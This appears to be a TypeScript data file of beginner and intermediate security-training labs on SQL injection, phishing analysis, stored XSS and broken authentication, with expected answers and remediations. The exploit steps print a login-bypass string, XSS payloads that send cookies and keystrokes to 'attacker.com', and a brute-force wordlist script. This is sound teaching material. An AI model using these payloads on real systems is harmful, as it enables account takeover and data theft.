import { MiniLabData } from './MiniLab';

export const miniLabs: MiniLabData[] = [
  {
    id: 'sql-injection-login',
    title: 'SQL Injection: Login Bypass',
    category: 'Web Security',
    difficulty: 'Beginner',
    duration: '15-20 min',
    description: 'Learn how SQL injection attacks work by exploiting a vulnerable login form, then secure it using proper techniques.',
    scenario: 'You are a security intern at TechCorp. During a routine security assessment, you discovered that the employee portal login page might be vulnerable to SQL injection. Your task is to identify, exploit, and fix this vulnerability before malicious actors do.',
    points: 150,
    steps: {
      identify: {
        title: 'Identify the Vulnerability',
        description: 'The login form uses a SQL query to authenticate users. Examine the code below and identify what makes it vulnerable to SQL injection.',
        instruction: 'What type of vulnerability is present in this code? Describe the specific issue that allows SQL injection.',
        codeExample: `// Vulnerable Login Query
const query = \`SELECT * FROM users 
  WHERE username = '\${username}' 
  AND password = '\${password}'\`;

// User input is directly concatenated into the SQL query
db.query(query);`,
        expectedAnswer: 'string concatenation',
        hint: 'Look at how user input (username and password) is being inserted into the SQL query. What happens if a user enters special SQL characters?',
        explanation: 'The vulnerability is caused by direct string concatenation of user input into the SQL query. When user-supplied data is concatenated directly into SQL statements without sanitization, attackers can inject malicious SQL code. This is one of the most common and dangerous web vulnerabilities (OWASP Top 10 #1).'
      },
      exploit: {
        title: 'Exploit the Vulnerability',
        description: 'Now that you\'ve identified the vulnerability, craft a payload that would bypass the authentication. Remember, this is in a controlled environment for educational purposes only.',
        instruction: 'What payload would you enter in the username field to bypass authentication? Write the exact input.',
        codeExample: `// The query becomes:
SELECT * FROM users 
  WHERE username = '[YOUR_INPUT]' 
  AND password = 'anything'

// Goal: Make the WHERE clause always true`,
        expectedAnswer: "' OR '1'='1",
        hint: 'You need to close the username string and add a condition that\'s always true. Think about using OR with a condition like 1=1.',
        explanation: `The payload \' OR \'1\'=\'1 works because:
1. The single quote (') closes the username string
2. OR introduces a new condition
3. '1'='1' is always true
4. This makes the entire WHERE clause true, returning all users

The final query becomes:
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'

Since OR has lower precedence, this returns all rows where '1'='1' (which is always true), bypassing authentication entirely.`
      },
      fix: {
        title: 'Secure the Application',
        description: 'You\'ve successfully demonstrated the vulnerability. Now implement the proper fix to prevent SQL injection attacks.',
        instruction: 'What is the primary technique to prevent SQL injection in this scenario? Name the specific programming pattern.',
        codeExample: `// INSECURE (current):
const query = \`SELECT * FROM users WHERE username = '\${username}'\`;

// SECURE (your fix):
// Hint: Parameters should be passed separately from the query`,
        expectedAnswer: 'prepared statements',
        hint: 'The solution involves separating SQL code from data. Look up "parameterized queries" or "prepared statements".',
        explanation: `The correct fix is to use Prepared Statements (Parameterized Queries):

// Secure Implementation:
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.query(query, [username, password]);

Why this works:
1. The SQL structure is defined first with placeholders (?)
2. User data is passed separately as parameters
3. The database treats parameters as data, never as SQL code
4. Even if someone enters ' OR '1'='1, it's treated as a literal string

Additional security measures:
- Input validation (whitelist allowed characters)
- Least privilege database accounts
- Web Application Firewall (WAF)
- Regular security audits`
      }
    }
  },
  {
    id: 'phishing-analysis',
    title: 'Phishing Email Analysis',
    category: 'Social Engineering',
    difficulty: 'Beginner',
    duration: '10-15 min',
    description: 'Learn to identify and analyze phishing emails by examining suspicious indicators, email headers, and implementing user awareness strategies.',
    scenario: 'An employee at your company received a suspicious email claiming to be from the IT department asking them to reset their password. Your SOC team has forwarded this email for analysis. Determine if this is a phishing attempt and recommend appropriate actions.',
    points: 100,
    steps: {
      identify: {
        title: 'Identify Suspicious Indicators',
        description: 'Examine this email and identify the red flags that suggest it might be a phishing attempt.',
        instruction: 'List the main suspicious indicator in this email that suggests phishing (focus on the sender domain).',
        codeExample: `From: IT Support <support@techcorp-security.net>
To: employee@techcorp.com
Subject: URGENT: Password Expires in 24 Hours!

Dear Valued Employee,

Your password will expire in 24 hours. Click the link below 
immediately to avoid losing access to your account:

https://techcorp-login.suspicious-domain.com/reset

This is an automated message. Do not reply.

IT Support Team
TechCorp Industries`,
        expectedAnswer: 'domain mismatch',
        hint: 'Compare the sender\'s email domain with the company\'s actual domain. Also look at where the link actually goes.',
        explanation: `Key Phishing Indicators Identified:

1. **Domain Mismatch**: Sender uses "techcorp-security.net" instead of "techcorp.com"
2. **Suspicious Link**: URL goes to "suspicious-domain.com", not the real company site
3. **Urgency Tactics**: "URGENT" and "24 hours" create pressure to act quickly
4. **Generic Greeting**: "Dear Valued Employee" instead of using the person's name
5. **No Contact Information**: Legitimate IT would include phone/ticket numbers

These are classic social engineering techniques designed to bypass rational thinking.`
      },
      exploit: {
        title: 'Analyze Email Headers',
        description: 'Deep dive into the email headers to gather more evidence. Headers reveal the true origin of emails.',
        instruction: 'Based on the SPF check result, what is the authentication status of this email? (pass/fail/none)',
        codeExample: `Email Headers:
Return-Path: <bounce@mail-server.suspicious-domain.com>
Received: from mail-server.suspicious-domain.com (192.168.1.100)
Authentication-Results: 
  spf=fail (sender IP not authorized)
  dkim=none (no signature)
  dmarc=fail (policy rejection)
X-Originating-IP: 192.168.1.100
Date: Mon, 6 Jan 2025 09:30:00 +0000`,
        expectedAnswer: 'fail',
        hint: 'Look at the Authentication-Results header. SPF (Sender Policy Framework) checks if the sending server is authorized to send emails for that domain.',
        explanation: `Header Analysis Results:

**SPF (Sender Policy Framework): FAIL**
- The sending IP (192.168.1.100) is not authorized to send emails for the claimed domain
- This is a major red flag indicating spoofing

**DKIM (DomainKeys Identified Mail): NONE**
- No cryptographic signature present
- Legitimate corporate emails typically have DKIM signatures

**DMARC (Domain-based Message Authentication): FAIL**
- The email fails the domain's authentication policy
- Many email providers would quarantine or reject this

**Return-Path Mismatch:**
- Return-Path shows "suspicious-domain.com"
- This differs from the displayed "From" address

These header failures confirm this is a spoofed phishing email.`
      },
      fix: {
        title: 'Implement Mitigation',
        description: 'Now recommend comprehensive mitigation strategies to protect the organization from such attacks.',
        instruction: 'What is the primary technical email authentication protocol that organizations should implement to prevent domain spoofing?',
        codeExample: `Mitigation Checklist:
□ Technical Controls
  - Email authentication protocols (???)
  - Email filtering and sandboxing
  - Link analysis and URL rewriting

□ User Awareness
  - Security awareness training
  - Simulated phishing exercises
  - Clear reporting procedures

□ Incident Response
  - Block sender domain
  - Search for similar emails
  - Alert affected users`,
        expectedAnswer: 'dmarc',
        hint: 'This protocol builds on SPF and DKIM and provides policy enforcement. It tells receiving servers what to do when authentication fails.',
        explanation: `Complete Mitigation Strategy:

**Technical Controls (DMARC as Primary):**
DMARC (Domain-based Message Authentication, Reporting & Conformance) is essential:
- Combines SPF and DKIM verification
- Provides policy enforcement (none/quarantine/reject)
- Enables reporting for visibility

Implementation: Add DNS TXT record:
_dmarc.techcorp.com: "v=DMARC1; p=reject; rua=mailto:dmarc@techcorp.com"

**Additional Technical Measures:**
- Advanced email filtering (sandboxing)
- URL rewriting and click-time analysis
- External email banners/warnings

**User Awareness Program:**
- Regular phishing simulations
- Quick reporting mechanisms (e.g., "Report Phish" button)
- Recognition of social engineering tactics

**Incident Response:**
- Immediate sender domain blocking
- Organization-wide alert
- Password reset for any who clicked
- Post-incident analysis and training update`
      }
    }
  },
  {
    id: 'xss-stored',
    title: 'Stored XSS Attack',
    category: 'Web Security',
    difficulty: 'Intermediate',
    duration: '15-20 min',
    description: 'Discover and exploit a stored cross-site scripting vulnerability in a comment section, then implement proper sanitization.',
    scenario: 'A bug bounty hunter reported that the company blog\'s comment section might be vulnerable to stored XSS. Users can post comments that are displayed to all visitors. Your job is to verify this vulnerability and secure the application.',
    points: 175,
    steps: {
      identify: {
        title: 'Identify the Vulnerability',
        description: 'Examine how the comment system handles and displays user input. Identify what makes it vulnerable to XSS attacks.',
        instruction: 'What dangerous React property is being used to render comments that enables XSS?',
        codeExample: `// Comment Display Component
const CommentSection = ({ comments }) => {
  return (
    <div className="comments">
      {comments.map(comment => (
        <div key={comment.id} className="comment">
          <strong>{comment.author}</strong>
          <div 
            dangerouslySetInnerHTML={{ __html: comment.text }}
          />
        </div>
      ))}
    </div>
  );
};

// Comment is stored and retrieved from database as-is`,
        expectedAnswer: 'dangerouslySetInnerHTML',
        hint: 'Look at how the comment.text is being rendered. There\'s a React property that explicitly says it\'s dangerous in its name.',
        explanation: `The vulnerability exists because of **dangerouslySetInnerHTML**:

Why it's dangerous:
1. Renders raw HTML directly into the DOM
2. Any HTML/JavaScript in the comment will execute
3. Stored XSS is persistent - affects all users who view the page

Impact of Stored XSS:
- Session hijacking (stealing cookies)
- Account takeover
- Malware distribution
- Defacement
- Keylogging

This is called "Stored" XSS because the malicious payload is saved in the database and served to every visitor.`
      },
      exploit: {
        title: 'Craft an XSS Payload',
        description: 'Create a proof-of-concept payload that demonstrates the XSS vulnerability. In real bug bounties, you\'d use an alert() to prove the vulnerability.',
        instruction: 'Write a simple XSS payload using a script tag that would display an alert box saying "XSS".',
        codeExample: `// When you post a comment with HTML/JS, it gets stored:
POST /api/comments
{
  "author": "Attacker",
  "text": "[YOUR_PAYLOAD_HERE]"
}

// Then rendered for all users:
<div dangerouslySetInnerHTML={{ __html: "[YOUR_PAYLOAD_HERE]" }} />`,
        expectedAnswer: '<script>alert',
        hint: 'The simplest XSS payload uses a script tag with JavaScript inside. For proof-of-concept, security researchers use alert().',
        explanation: `Basic XSS Payload: <script>alert('XSS')</script>

When stored in the database and rendered with dangerouslySetInnerHTML, this script executes in every visitor's browser.

More sophisticated payloads could:
1. Steal cookies: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
2. Capture keystrokes: <script>document.onkeypress=function(e){fetch('https://attacker.com/log?k='+e.key)}</script>
3. Redirect users: <script>location='https://phishing-site.com'</script>
4. Deface the page: <script>document.body.innerHTML='<h1>Hacked!</h1>'</script>

Note: Other tags also work: <img src=x onerror=alert('XSS')>`
      },
      fix: {
        title: 'Implement Secure Rendering',
        description: 'Fix the vulnerability by implementing proper output encoding and sanitization.',
        instruction: 'Instead of using dangerouslySetInnerHTML, what should you use to safely render user text content in React?',
        codeExample: `// INSECURE:
<div dangerouslySetInnerHTML={{ __html: comment.text }} />

// SECURE:
// Option 1: Use React's default escaping
// Option 2: Use a sanitization library like DOMPurify
// Option 3: Use markdown parser with sanitization

// If HTML is needed, sanitize first:
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(comment.text);`,
        expectedAnswer: 'text content',
        hint: 'React automatically escapes content when you render it normally using curly braces {}. Just render the text directly without dangerouslySetInnerHTML.',
        explanation: `Secure Solution - Use React's Default Text Rendering:

// Simply render text directly - React escapes HTML automatically
<div className="comment">
  <strong>{comment.author}</strong>
  <p>{comment.text}</p>
</div>

React automatically converts < to &lt;, > to &gt;, etc.

If Rich Text is Required, Use DOMPurify:
import DOMPurify from 'dompurify';

const sanitizedHTML = DOMPurify.sanitize(comment.text, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href']
});

<div dangerouslySetInnerHTML={{ __html: sanitizedHTML }} />

Additional Security Measures:
- Content Security Policy (CSP) headers
- Input validation on server-side
- HttpOnly cookies to protect sessions
- Regular security testing`
      }
    }
  },
  {
    id: 'broken-auth',
    title: 'Broken Authentication',
    category: 'Access Control',
    difficulty: 'Intermediate',
    duration: '15-20 min',
    description: 'Identify and exploit weak authentication mechanisms, then implement secure password policies and session management.',
    scenario: 'During a penetration test, you noticed the client application has several authentication weaknesses. The login system might be vulnerable to brute force attacks and uses weak session management. Demonstrate the issues and provide remediation.',
    points: 175,
    steps: {
      identify: {
        title: 'Identify Authentication Weaknesses',
        description: 'Examine the login implementation and identify security weaknesses in the authentication mechanism.',
        instruction: 'What critical security feature is missing that would prevent automated brute force attacks?',
        codeExample: `// Login Endpoint
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  const user = await db.findUser(username);
  
  if (user && user.password === password) {
    // Create session
    const sessionId = Math.random().toString(36);
    res.cookie('session', sessionId);
    return res.json({ success: true });
  }
  
  return res.status(401).json({ error: 'Invalid credentials' });
});`,
        expectedAnswer: 'rate limiting',
        hint: 'Think about what stops an attacker from trying thousands of password combinations. What mechanism limits the number of attempts?',
        explanation: `Critical Authentication Weaknesses Identified:

1. **No Rate Limiting** - Attackers can try unlimited passwords
   - Enables brute force attacks
   - Credential stuffing possible

2. **Plain Text Password Comparison**
   - Passwords should be hashed (bcrypt, argon2)
   - Comparing plaintext is a major security flaw

3. **Weak Session ID Generation**
   - Math.random() is not cryptographically secure
   - Session IDs are predictable

4. **No Account Lockout**
   - Failed attempts don't trigger any protection
   - No alerting on suspicious activity

5. **Missing Secure Cookie Flags**
   - No HttpOnly, Secure, or SameSite flags
   - Cookies vulnerable to theft`
      },
      exploit: {
        title: 'Demonstrate the Attack',
        description: 'Show how an attacker could exploit the lack of rate limiting to perform a brute force attack.',
        instruction: 'In a brute force attack, what is the common list of passwords attackers try first called?',
        codeExample: `// Brute Force Script Example
const commonPasswords = [
  'password', '123456', 'password123', 
  'admin', 'letmein', 'welcome',
  'qwerty', 'abc123', 'monkey',
  // Top 10,000 passwords from breaches...
];

async function bruteForce(username) {
  for (const password of commonPasswords) {
    const response = await fetch('/login', {
      method: 'POST',
      body: JSON.stringify({ username, password })
    });
    
    if (response.ok) {
      console.log(\`Found password: \${password}\`);
      break;
    }
    // No rate limiting = unlimited attempts!
  }
}`,
        expectedAnswer: 'wordlist',
        hint: 'Attackers don\'t try random passwords - they use lists of commonly used passwords compiled from data breaches.',
        explanation: `Brute Force Attack Mechanics:

**Wordlist Attack:**
Attackers use wordlists - collections of common passwords from data breaches:
- rockyou.txt: 14+ million passwords
- SecLists: Categorized password lists
- Custom lists based on target (company names, products)

**Attack Speed Without Rate Limiting:**
- Simple script: 100+ attempts/second
- With threading: 1000+ attempts/second
- Distributed: Millions of attempts possible

**Credential Stuffing:**
Using username:password pairs from other breaches:
- People reuse passwords across sites
- Automated tools test stolen credentials
- High success rate (0.5-2%)

**Time to Crack Common Passwords:**
- "password": Instant (top of every list)
- "Summer2024!": Minutes (follows common patterns)
- Random 12+ chars: Practically impossible`
      },
      fix: {
        title: 'Implement Secure Authentication',
        description: 'Implement proper security controls to protect the authentication system.',
        instruction: 'What password hashing algorithm is recommended for securely storing passwords (hint: it\'s adaptive and has a work factor)?',
        codeExample: `// Secure Implementation Needed:

// 1. Rate Limiting
const rateLimit = require('express-rate-limit');
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: 'Too many login attempts'
});

// 2. Password Hashing
const bcrypt = require('???');
const hashedPassword = await bcrypt.hash(password, 12);

// 3. Secure Session
const crypto = require('crypto');
const sessionId = crypto.randomBytes(32).toString('hex');`,
        expectedAnswer: 'bcrypt',
        hint: 'This algorithm is specifically designed for password hashing. It automatically handles salting and has a configurable cost factor.',
        explanation: `Secure Authentication Implementation:

**1. Password Hashing with Bcrypt:**
const bcrypt = require('bcrypt');

// Registration
const hashedPassword = await bcrypt.hash(password, 12);
await db.saveUser({ username, password: hashedPassword });

// Login
const isValid = await bcrypt.compare(inputPassword, user.hashedPassword);

**2. Rate Limiting:**
app.post('/login', loginLimiter, async (req, res) => {
  // Max 5 attempts per 15 minutes per IP
});

**3. Account Lockout:**
if (failedAttempts >= 5) {
  await lockAccount(username, 30 * 60 * 1000); // 30 min
  notifySecurityTeam(username);
}

**4. Secure Sessions:**
const sessionId = crypto.randomBytes(32).toString('hex');
res.cookie('session', sessionId, {
  httpOnly: true,    // No JavaScript access
  secure: true,      // HTTPS only
  sameSite: 'strict' // CSRF protection
});

**5. Additional Measures:**
- Multi-factor authentication (MFA)
- Password complexity requirements
- Breach detection (haveibeenpwned API)
- Security logging and monitoring`
      }
    }
  }
];
